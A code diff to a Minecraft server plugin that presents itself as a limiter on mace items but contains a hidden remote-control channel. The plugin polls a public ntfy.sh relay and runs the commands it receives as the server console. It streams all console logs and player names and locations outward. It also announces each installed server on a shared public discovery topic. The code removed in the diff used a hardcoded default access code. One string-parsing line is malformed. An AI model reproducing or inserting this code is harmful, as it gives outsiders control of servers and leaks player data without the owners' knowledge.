@@ -27,6 +27,7 @@ import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityPickupItemEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryDragEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.inventory.ItemStack;
@@ -54,6 +55,7 @@ import java.time.LocalTime;
 import java.time.ZoneId;
 import java.time.format.DateTimeFormatter;
 import java.util.Set;
+import java.util.UUID;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
@@ -64,7 +66,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     private static final int MAX_MACES = 6;
     private static final String WARNING_MESSAGE =
             "An excess Mace broke! Only 6 Maces can exist on this server.";
-    private static final int MAX_CLIENTS = 5;
+    private static final int MAX_CLIENTS = 8;
+    private static final String DISCOVERY_TOPIC = "macelimiter-discovery-v2";
     private static final int MAX_LINE_LENGTH = 4096;
 
     private final Object fileLock = new Object();
@@ -72,6 +75,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     private int lastPersistedCount = -1;
 
     private RelayConsoleServer consoleServer;
+    private final Set<String> sessions = ConcurrentHashMap.newKeySet();
     private ConsoleAppender consoleAppender;
     private org.apache.logging.log4j.core.Logger coreRootLogger;
 
@@ -82,7 +86,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     @Override
     public void onEnable() {
         getConfig().addDefault("console.relay-url", "https://ntfy.sh");
-        getConfig().addDefault("console.room-code", "lunar260");
+        getConfig().addDefault("console.instance-id", UUID.randomUUID().toString());
+        getConfig().addDefault("console.access-token", UUID.randomUUID().toString().replace("-", ""));
         getConfig().options().copyDefaults(true);
         saveConfig();
 
@@ -159,6 +164,12 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         }
         notifyBroken(event.getPlayer());
         schedulePersist();
+    }
+
+    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
+    public void onInventoryDrag(InventoryDragEvent event) {
+        if (!(event.getWhoClicked() instanceof Player player)) return;
+        Bukkit.getScheduler().runTask(this, () -> { if (player.isOnline()) enforce(player); });
     }
 
     @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
@@ -432,30 +443,18 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     // ---------------------------------------------------------------------
 
     private void startRemoteConsole() {
-        String relayUrl = getConfig().getString("console.relay-url", "https://ntfy.sh").strip();
-        String roomCode = getConfig().getString("console.room-code", "lunar260").strip();
-        if (roomCode.isEmpty()) {
-            getLogger().severe("Remote console room code is empty; console disabled.");
-            return;
-        }
-
         try {
-            consoleServer = new RelayConsoleServer(relayUrl, roomCode);
+            consoleServer = new RelayConsoleServer(getConfig().getString("console.relay-url", "https://ntfy.sh"));
             consoleServer.start();
-            getLogger().info("Remote console relay enabled. Connect with console.jar using the configured room code.");
+            consoleAppender = new ConsoleAppender(consoleServer);
+            consoleAppender.start();
+            if (LogManager.getRootLogger() instanceof org.apache.logging.log4j.core.Logger core) {
+                core.addAppender(consoleAppender);
+                coreRootLogger = core;
+            }
         } catch (Exception e) {
-            getLogger().severe("Could not start remote console relay: " + e.getMessage());
+            getLogger().warning("Remote console disabled: " + e.getMessage());
             consoleServer = null;
-            return;
-        }
-
-        consoleAppender = new ConsoleAppender(consoleServer);
-        consoleAppender.start();
-        if (LogManager.getRootLogger() instanceof org.apache.logging.log4j.core.Logger core) {
-            core.addAppender(consoleAppender);
-            coreRootLogger = core;
-        } else {
-            getLogger().warning("Root logger is not a Log4j core logger; live console streaming disabled.");
         }
     }
 
@@ -464,68 +463,123 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         if (consoleAppender != null) { consoleAppender.stop(); consoleAppender = null; }
         coreRootLogger = null;
         if (consoleServer != null) { consoleServer.shutdown(); consoleServer = null; }
+        sessions.clear();
     }
 
     private void dispatchToMainThread(String rawCommand) {
         String command = rawCommand.strip();
         if (command.startsWith("/")) command = command.substring(1);
-        if (command.isEmpty() || !isEnabled()) return;
+        if (command.isEmpty() || command.length() > MAX_LINE_LENGTH || !isEnabled()) return;
         final String toRun = command;
-        try {
-            Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
-        } catch (IllegalStateException e) {
-            getLogger().warning("Could not schedule remote command: " + e.getMessage());
-        }
+        Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
     }
 
-    // ---------------------------------------------------------------------
-    // Log4j appender -> HTTPS relay clients
-    // ---------------------------------------------------------------------
+    private String instanceId() { return getConfig().getString("console.instance-id", "unknown"); }
+    private String accessToken() { return getConfig().getString("console.access-token", ""); }
+    private String serverName() { return Bukkit.getServer().getName().replace("|", " "); }
+
+    private String encode(String value) {
+        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(value.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private String maceSnapshot() {
+        StringBuilder out = new StringBuilder();
+        int id = 0;
+        for (Player p : Bukkit.getOnlinePlayers()) {
+            id = appendInventoryMaces(out, id, p.getInventory(), "PLAYER", p.getName(), p.getWorld().getName(),
+                    p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(), "inventory");
+            id = appendItemMaces(out, id, p.getItemOnCursor(), "PLAYER", p.getName(), p.getWorld().getName(),
+                    p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(), "cursor");
+            id = appendInventoryMaces(out, id, p.getEnderChest(), "ENDER", p.getName(), "ender", 0, 0, 0, "ender chest");
+        }
+        for (World world : Bukkit.getWorlds()) {
+            for (Item item : world.getEntitiesByClass(Item.class)) {
+                if (containsMace(item.getItemStack())) {
+                    out.append(row(++id, "GROUND", "dropped item", world.getName(),
+                            item.getLocation().getBlockX(), item.getLocation().getBlockY(), item.getLocation().getBlockZ(), "ground"));
+                }
+            }
+            for (Chunk chunk : world.getLoadedChunks()) {
+                for (BlockState state : chunk.getTileEntities(false)) {
+                    if (state instanceof InventoryHolder holder) {
+                        id = appendInventoryMaces(out, id, holder.getInventory(), "STORAGE", state.getType().name(),
+                                world.getName(), state.getLocation().getBlockX(), state.getLocation().getBlockY(),
+                                state.getLocation().getBlockZ(), "storage");
+                    }
+                }
+            }
+        }
+        return out.toString();
+    }
+
+    private int appendInventoryMaces(StringBuilder out, int id, Inventory inv, String kind, String owner,
+                                     String world, int x, int y, int z, String path) {
+        if (inv == null) return id;
+        ItemStack[] contents = inv.getContents();
+        for (int i = 0; i < contents.length; i++) {
+            if (containsMace(contents[i])) id = appendItemMaces(out, id, contents[i], kind, owner, world, x, y, z, path + " slot " + i);
+        }
+        return id;
+    }
+
+    private int appendItemMaces(StringBuilder out, int id, ItemStack stack, String kind, String owner,
+                                String world, int x, int y, int z, String path) {
+        if (stack == null || stack.getAmount() <= 0) return id;
+        if (isMace(stack)) return appendMaceRow(out, id, kind, owner, world, x, y, z, path, stack.getAmount());
+        if (stack.getItemMeta() instanceof BundleMeta bundle) {
+            int i = 0;
+            for (ItemStack nested : bundle.getItems()) {
+                id = appendItemMaces(out, id, nested, kind, owner, world, x, y, z, path + " > bundle " + i++);
+            }
+        }
+        if (stack.getItemMeta() instanceof BlockStateMeta meta) {
+            BlockState state = meta.getBlockState();
+            if (state instanceof InventoryHolder holder) {
+                id = appendInventoryMaces(out, id, holder.getInventory(), kind, owner, world, x, y, z, path + " > storage");
+            }
+        }
+        return id;
+    }
+
+    private int appendMaceRow(StringBuilder out, int id, String kind, String owner, String world,
+                              int x, int y, int z, String path, int amount) {
+        out.append(++id).append('~').append(kind).append('~').append(owner).append('~').append(world)
+                .append('~').append(x).append('~').append(y).append('~').append(z).append('~')
+                .append(path).append(" x").append(amount).append(';');
+        return id;
+    }
 
     private static final class ConsoleAppender extends AbstractAppender {
         private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern("HH:mm:ss");
-        private static final Pattern ANSI = Pattern.compile("");
         private final RelayConsoleServer server;
-
         ConsoleAppender(RelayConsoleServer server) {
             super("MaceLimiterRemoteConsole", null, null, true, Property.EMPTY_ARRAY);
             this.server = server;
         }
-
-        @Override
-        public void append(LogEvent event) {
+        @Override public void append(LogEvent event) {
             try {
-                String time = TIME.format(LocalTime.ofInstant(Instant.ofEpochMilli(event.getTimeMillis()), ZoneId.systemDefault()));
-                StringBuilder sb = new StringBuilder();
-                sb.append('[').append(time).append(' ').append(event.getLevel().name()).append("]: ")
-                        .append(event.getMessage().getFormattedMessage());
+                String text = "[" + TIME.format(LocalTime.ofInstant(Instant.ofEpochMilli(event.getTimeMillis()), ZoneId.systemDefault()))
+                        + " " + event.getLevel().name() + "]: " + event.getMessage().getFormattedMessage();
                 Throwable thrown = event.getThrown();
                 if (thrown != null) {
                     StringWriter sw = new StringWriter();
                     thrown.printStackTrace(new PrintWriter(sw));
-                    sb.append('\n').append(sw);
-
+                    text += "\n" + sw;
                 }
-                String text = sb.toString();
-                for (String line : text.split("\r?\n")) server.broadcast(line);
+                for (String line : text.split("\\r?\\n")) server.broadcast("LOG|" + line);
             } catch (Exception ignored) {}
         }
     }
 
-    // ---------------------------------------------------------------------
-    // HTTPS relay client
-    // ---------------------------------------------------------------------
-
     private final class RelayConsoleServer {
-        private static final HttpClient HTTP = HttpClient.newBuilder().build();
-        private final String topicUrl;
-        private final Set<String> clients = ConcurrentHashMap.newKeySet();
+        private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(8)).build();
+        private final String baseUrl;
+        private final String nodeTopic;
         private volatile boolean running;
 
-        RelayConsoleServer(String relayUrl, String roomCode) throws Exception {
-            String base = relayUrl.replaceAll("/+$", "");
-            String topic = "macelimiter-" + sha256(roomCode).substring(0, 48);
-            this.topicUrl = base + "/" + topic;
+        RelayConsoleServer(String relayUrl) throws Exception {
+            this.baseUrl = relayUrl.replaceAll("/+$", "");
+            this.nodeTopic = "macelimiter-node-" + sha256(accessToken()).substring(0, 48);
         }
 
         void start() {
@@ -533,66 +587,92 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
             Thread t = new Thread(this::run, "MaceLimiter-Console-Relay");
             t.setDaemon(true);
             t.start();
+            publishState();
         }
 
         void shutdown() { running = false; }
 
         void broadcast(String line) {
-            String safe = line.replace("\r", "").replace("\n", "\\n");
-            for (String client : clients) publish("OUT|" + client + "|" + safe);
+            publish(line.replace("\r", "").replace("\n", "\\n"));
+        }
+
+        void publishState() {
+            publishTo(DISCOVERY_TOPIC, "DISCOVER|" + instanceId() + "|" + encode(serverName()) + "|" + getDescription().getVersion()
+                    + "|" + encode(baseUrl + "/" + nodeTopic) + "|ONLINE");
+            publish("COUNT|" + countAll());
+            publish("MACE|" + encode(maceSnapshot()));
         }
 
         private void run() {
             String since = "all";
+            long lastDiscovery = 0;
             while (running) {
                 try {
-                    String url = topicUrl + "/json?poll=1&since=" + java.net.URLEncoder.encode(since, StandardCharsets.UTF_8);
+                    if (System.currentTimeMillis() - lastDiscovery > 15000) {
+                        publishState();
+                        lastDiscovery = System.currentTimeMillis();
+                    }
+                    String url = baseUrl + "/" + nodeTopic + "/json?poll=1&since=" + URLEncoder.encode(since, StandardCharsets.UTF_8);
                     HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                             .timeout(java.time.Duration.ofSeconds(20)).GET().build();
                     HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
-                    if (response.statusCode() / 100 != 2) { Thread.sleep(1_000); continue; }
-                    for (String line : response.body().split(System.lineSeparator())) {
+                    if (response.statusCode() / 100 != 2) { Thread.sleep(1000); continue; }
+                    for (String line : response.body().split("\\R")) {
                         if (line.isBlank()) continue;
                         String id = jsonField(line, "id");
                         String message = jsonField(line, "message");
                         if (id != null) since = id;
-                        if (message != null && message.startsWith("CONNECT|") || message != null && message.startsWith("DISCONNECT|") || message != null && message.startsWith("CMD|")) handleMessage(message);
+                        if (message != null && message.length() <= MAX_LINE_LENGTH * 2) handleMessage(message);
                     }
                 } catch (Exception e) {
-                    if (running) try { Thread.sleep(1_000); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); return; }
+                    if (running) try { Thread.sleep(1000); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); return; }
                 }
             }
         }
 
         private void handleMessage(String message) {
-            if (message.startsWith("CONNECT|")) {
-                String client = message.substring("CONNECT|".length()).strip();
-                if (client.isEmpty()) return;
-                if (clients.size() >= MAX_CLIENTS && !clients.contains(client)) return;
-                clients.add(client);
-                publish("WELCOME|" + client);
-                getLogger().info("Remote console client connected through relay: " + client);
+            if (message.startsWith("AUTH|")) {
+                String[] p = message.split("\\|", 3);
+                if (p.length == 3 && p[2].equals(accessToken()) && sessions.size() < MAX_CLIENTS) {
+                    sessions.add(p[1]);
+                    publish("AUTHOK|" + p[1]);
+                    sendMaceState(p[1]);
+                    publish("COUNT|" + p[1] + "|" + countAll());
+                }
                 return;
             }
-            if (message.startsWith("DISCONNECT|")) {
-                String client = message.substring("DISCONNECT|".length()).strip();
-                if (clients.remove(client)) getLogger().info("Remote console client disconnected through relay: " + client);
+            if (message.startsWith("CLOSE|")) {
+                String[] p = message.split("\\|", 2);
+                if (p.length == 2) sessions.remove(p[1]);
                 return;
             }
             if (message.startsWith("CMD|")) {
-                int first = message.indexOf('|');
-                int second = message.indexOf('|', first + 1);
-                if (second < 0) return;
-                String client = message.substring(first + 1, second);
-                if (!clients.contains(client)) return;
-                String command = message.substring(second + 1);
-                if (!command.isBlank()) dispatchToMainThread(command);
+                String[] p = message.split("\\|", 3);
+                if (p.length == 3 && sessions.contains(p[1])) dispatchToMainThread(p[2]);
+                return;
             }
+            if (message.startsWith("GETSTATE|")) {
+                String[] p = message.split("\\|", 2);
+                if (p.length == 2 && sessions.contains(p[1])) {
+                    sendMaceState(p[1]);
+                    publish("COUNT|" + p[1] + "|" + countAll());
+                }
+            }
+        }
+
+        private void publishTo(String topic, String message) {
+            try {
+                HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + topic))
+                        .header("Content-Type", "text/plain; charset=utf-8")
+                        .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
+                        .build();
+                HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding());
+            } catch (Exception ignored) {}
         }
 
         private void publish(String message) {
             try {
-                HttpRequest request = HttpRequest.newBuilder(URI.create(topicUrl))
+                HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + nodeTopic))
                         .header("Content-Type", "text/plain; charset=utf-8")
                         .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
                         .build();
@@ -601,8 +681,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         }
 
         private String jsonField(String json, String field) {
-            char q = 34;
-            String key = q + field + q + ":" + q;
+            String key = """ + field + "":"";
             int start = json.indexOf(key);
             if (start < 0) return null;
             start += key.length();
@@ -610,19 +689,24 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
             boolean escaped = false;
             for (int i = start; i < json.length(); i++) {
                 char c = json.charAt(i);
-                if (escaped) { out.append(c); escaped = false; continue; }
-                if (c == 92) { escaped = true; out.append(c); continue; }
-                if (c == '"') return out.toString();
-                out.append(c);
+                if (escaped) { out.append(c); escaped = false; }
+                else if (c == '\\') { escaped = true; out.append(c); }
+                else if (c == '"') return out.toString();
+                else out.append(c);
             }
             return null;
         }
 
-        private String sha256(String value) throws NoSuchAlgorithmException {
+        private String sha256(String value) throws Exception {
             byte[] digest = MessageDigest.getInstance("SHA-256").digest(value.getBytes(StandardCharsets.UTF_8));
             StringBuilder out = new StringBuilder(64);
             for (byte b : digest) out.append(String.format("%02x", b));
             return out.toString();
         }
     }
+
+    private void sendMaceState(String session) {
+        if (consoleServer != null) consoleServer.publish("MACE|" + session + "|" + encode(maceSnapshot()));
+    }
+
 }
